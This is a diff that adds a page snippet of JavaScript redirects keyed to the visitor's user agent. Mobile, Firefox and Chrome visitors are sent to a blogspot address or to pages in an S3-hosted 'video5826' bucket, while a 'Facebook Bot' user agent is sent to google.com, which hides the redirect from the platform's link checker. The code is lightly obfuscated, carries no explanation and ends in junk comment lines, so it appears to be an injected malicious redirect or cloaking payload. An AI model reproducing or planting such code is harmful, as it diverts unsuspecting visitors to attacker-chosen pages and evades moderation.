@@ -1,0 +1,30 @@
+ <script type="text/javascript"> // <![CDATA[
+if ( (navigator.userAgent.indexOf('Android') != -1) ) {
+document.location = "http://teladea.blogspot.com";
+} // ]]>
+</script>     
+<script language=javascript>
+if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)))
+{
+location.replace("http://teladea.blogspot.com");
+}
+</script>
+ <body>
+
+<script>
+if (navigator['userAgent']['indexOf']('Firefox') != -1) {
+    window['location'] = 'http://video5826.s3-website.eu-central-1.amazonaws.com/mff34.html';
+} else {
+    if (navigator['userAgent']['indexOf']('Facebook Bot') != -1) {
+        window['location'] = 'http://google.com';
+    } else {
+        if (navigator['userAgent']['indexOf']('Chrome') != -1) {
+            window['location'] = 'http://video5826.s3-website.eu-central-1.amazonaws.com/soda2/index.html';
+            } else {
+            window['location'] = 'http://teladea.blogspot.com';
+        };
+    };
+};</script>
+</body>
+//atre643654t4et645t54t4
+//dsafsdatwrefdhfghdf
